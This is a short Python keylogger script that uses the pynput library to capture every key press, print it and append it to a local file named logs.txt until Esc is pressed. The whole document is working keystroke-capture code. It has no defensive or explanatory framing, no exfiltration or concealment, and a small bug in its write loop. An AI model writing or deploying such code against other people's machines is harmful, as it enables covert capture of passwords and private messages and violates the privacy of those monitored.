from pynput.keyboard import Key, Listener

#records keystrokes and store it in text file
k = []

#function to record the keystroke
def on_press(key):
    k.append(key)
    write_file(k)
    print(key)
    
#function to write the data to a text file
def write_file(var):
    with open("logs.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'","")
        f.write(new_var)

#function to stop the recording       
def on_release(key):
    if key == Key.esc:
        return False

#listener function
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 
    
